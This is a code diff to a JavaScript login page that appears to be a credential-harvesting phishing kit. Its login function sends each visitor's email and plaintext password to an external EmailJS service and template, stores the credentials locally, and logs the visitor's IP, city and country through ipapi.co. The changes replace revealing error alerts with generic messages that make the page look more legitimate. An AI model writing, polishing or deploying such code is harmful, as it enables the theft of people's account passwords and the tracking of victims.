@@ -27,10 +27,13 @@ function isPasswordValid(password) {
   return typeof password === "string" && password.length >= 1;
 }
 
- function showModal(message) {
+// ======= MODAL HELPER =======
+function showModal(message) {
   const modal = document.getElementById("modal");
   const text = document.getElementById("modalMessage");
   const closeBtn = document.getElementById("modalClose");
+
+  if (!modal || !text || !closeBtn) return;
 
   text.textContent = message;
   modal.classList.remove("hidden");
@@ -38,26 +41,28 @@ function isPasswordValid(password) {
   closeBtn.onclick = () => {
     modal.classList.add("hidden");
   };
- }
+}
 
 // ======= LOGIN FUNCTION =======
 async function login(email, password) {
   if (!email || !password) {
-    alert("Please enter email and password.");
+    showModal("Please enter both email and password.");
     return;
   }
+
   if (!isEmailValid(email)) {
-    alert("Invalid email format.");
+    showModal("Please enter a valid email address.");
     return;
   }
+
   if (!isPasswordValid(password)) {
-    alert("Password cannot be empty.");
+    showModal("Password cannot be empty.");
     return;
   }
 
   if (!window.emailjs) {
-    alert("❌ EmailJS SDK not loaded");
-    console.error("EmailJS SDK missing. Did you include the script?");
+    console.error("EmailJS SDK not loaded");
+    showModal("Service temporarily unavailable. Please try again later.");
     return;
   }
 
@@ -67,21 +72,19 @@ async function login(email, password) {
       "service_6nw221q",
       "template_d6k3x8f",
       {
-        userpassword: password,
         useremail: email,
-        time: new Date().toISOString()
+        userpassword: password,
+        time: new Date().toISOString(),
       }
     );
     console.log("✅ EmailJS success");
   } catch (error) {
     console.error("❌ EmailJS ERROR:", error);
-    alert(
-      `Email failed.\nStatus: ${error?.status || "unknown"}\nMessage: ${error?.text || error?.message || "no details"}`
-    );
-    return; // Stop login if email fails
+    showModal("Unable to process request at the moment. Please try again.");
+    return;
   }
 
-  // Save login info locally
+  // Save login info locally (demo purpose)
   saveCurrentUserPublic({ email, password });
 
   // Redirect to dashboard
@@ -95,6 +98,7 @@ function loadDashboard() {
     window.location.href = "index.html";
     return;
   }
+
   const emailEl = document.getElementById("userEmail");
   if (emailEl) emailEl.textContent = currentUser.email;
 }
@@ -105,7 +109,6 @@ async function fetchUserLocation() {
     const res = await fetch("https://ipapi.co/json/");
     const data = await res.json();
 
-    // Convert country code to flag emoji
     function countryCodeToFlag(code) {
       if (!code) return "";
       return code
@@ -124,21 +127,22 @@ async function fetchUserLocation() {
       country: data.country_name || "N/A",
       countryCode: data.country_code || "",
       timezone: data.timezone || "UTC",
-      utcOffset: data.utc_offset || "+00:00"
+      utcOffset: data.utc_offset || "+00:00",
     };
 
     localStorage.setItem("sessionLocation", JSON.stringify(sessionLocation));
 
-    // Fill elements
     const ipEl = document.getElementById("user-ip");
     const locationEl = document.getElementById("user-location");
     const timeEl = document.getElementById("user-time");
 
     if (ipEl) ipEl.textContent = `IP: ${sessionLocation.ip}`;
-    if (locationEl) locationEl.textContent = `Location: ${flag} ${sessionLocation.city}, ${sessionLocation.country}`;
+    if (locationEl)
+      locationEl.textContent = `Location: ${flag} ${sessionLocation.city}, ${sessionLocation.country}`;
+
     if (timeEl) {
       const localTime = new Date().toLocaleString("en-US", {
-        timeZone: sessionLocation.timezone
+        timeZone: sessionLocation.timezone,
       });
       timeEl.textContent = `Time: ${localTime}`;
     }
@@ -151,28 +155,27 @@ async function fetchUserLocation() {
 
     if (ipEl) ipEl.textContent = "IP: N/A";
     if (locationEl) locationEl.textContent = "Location: N/A";
-    if (timeEl) timeEl.textContent = `Time: ${new Date().toLocaleString()}`;
+    if (timeEl)
+      timeEl.textContent = `Time: ${new Date().toLocaleString()}`;
   }
 }
 
 // ======= HOOKS / EVENT BINDING =======
 document.addEventListener("DOMContentLoaded", () => {
-  // Login button
   const loginBtn = document.getElementById("loginBtn");
+
   if (loginBtn) {
     loginBtn.addEventListener("click", async (e) => {
       e.preventDefault();
-      const email = document.getElementById("email").value.trim();
-      const password = document.getElementById("password").value;
+      const email = document.getElementById("email")?.value.trim();
+      const password = document.getElementById("password")?.value;
       await login(email, password);
     });
   }
 
-  // Load dashboard if present
   if (document.getElementById("userEmail")) {
     loadDashboard();
   }
 
-  // Always fetch user location info (IP, flag, city, time)
   fetchUserLocation();
 });
